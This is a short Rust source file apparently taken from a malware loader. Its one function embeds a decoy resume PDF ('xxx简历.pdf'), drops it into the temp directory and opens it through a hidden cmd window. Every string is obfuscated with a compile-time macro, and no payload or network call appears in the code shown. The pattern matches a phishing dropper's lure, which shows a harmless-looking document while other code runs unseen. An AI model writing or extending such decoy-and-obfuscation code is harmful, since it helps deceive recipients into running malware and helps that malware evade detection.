use std::io::Write;
use std::os::windows::process::CommandExt;
use tempfile::NamedTempFile;
use rustcrypt_ct_macros::obf_lit;

#[allow(dead_code)]
pub fn bundlefile() {

    const MEMORY_FILE: &[u8] = include_bytes!("../../bundle/xxx简历.pdf");
    const CREATE_NO_WINDOW: u32 = 0x08000000;

    let mut temp_file = NamedTempFile::new().unwrap();
    let original_file_name = obf_lit!("xxx简历.pdf"); // 原始文件名
    let _file_extension = obf_lit!("pdf"); // 文件后缀名
    
    let temp_dir = temp_file.path().parent().unwrap();
    let temp_file_path = temp_dir.join(original_file_name);

    temp_file.write_all(MEMORY_FILE).unwrap();
    temp_file.flush().unwrap();

    std::fs::rename(temp_file.path(), &temp_file_path).expect(&obf_lit!("Failed to rename temporary file"));

    use std::process::Command;
    Command::new(obf_lit!("cmd"))
        .args(&[obf_lit!("/c"), obf_lit!("start"), obf_lit!("/B"), temp_file_path.to_str().unwrap().to_string()])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .expect(&obf_lit!("Failed to open file"));
}
